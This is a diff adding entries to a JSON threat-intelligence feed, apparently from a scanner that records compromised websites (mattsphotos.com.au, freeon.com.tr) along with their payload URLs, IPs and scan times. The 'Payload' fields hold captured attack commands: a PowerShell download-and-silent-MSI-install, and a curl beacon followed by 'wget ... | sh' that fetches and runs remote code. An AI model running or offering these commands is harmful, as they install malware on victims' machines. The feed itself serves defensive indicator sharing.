@@ -1,5 +1,55 @@
 [
   {
+    "UrlDomain": "mattsphotos.com.au",
+    "DeliveryUrl": [
+      "softsyncizobrazie.net"
+    ],
+    "PayloadUrl": [
+      "http://softsyncizobrazie.net/x"
+    ],
+    "IP": [
+      "65.21.135.42"
+    ],
+    "Related": [],
+    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
+    "ResolvedDownloadUrl": [
+      "http://softsyncizobrazie.net/x"
+    ],
+    "ReportId": "cmwfcanbl0gd80omlgekvfmd3",
+    "ScannedAt": "2026-11-13T18:58:09.495000+00:00"
+  },
+  {
+    "UrlDomain": "freeon.com.tr",
+    "DeliveryUrl": [
+      "browse-cloud.codes",
+      "script.google.com",
+      "script-six-tawny.vercel.app",
+      "2ffreeon.com.tr"
+    ],
+    "PayloadUrl": [
+      "https://script-six-tawny.vercel.app/lin",
+      "https://script-six-tawny.vercel.app/win",
+      "https://script-six-tawny.vercel.app/mac",
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec"
+    ],
+    "IP": [
+      "46.202.172.35"
+    ],
+    "Related": [
+      {
+        "Value": "https://muddledramblings.com/table-of-css3-border-radius-compliance",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "curl -sL -d \"id=c359958e-4895-48f0-a73c-f65ab1e9296e&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Ffreeon.com.tr%2F&os=Linux%20x86_64&lastVisitAt=2026-11-13T18%3A26%3A50.782Z&lastShellAt=2026-11-13T18%3A26%3A50.782Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
+    "ResolvedDownloadUrl": [
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://script-six-tawny.vercel.app/lin"
+    ],
+    "ReportId": "cmwfb87f30g8x0omlp6pbqff9",
+    "ScannedAt": "2026-11-13T18:28:15.921000+00:00"
+  },
+  {
     "UrlDomain": "www.test20.russvpn.online",
     "DeliveryUrl": [],
     "PayloadUrl": [],
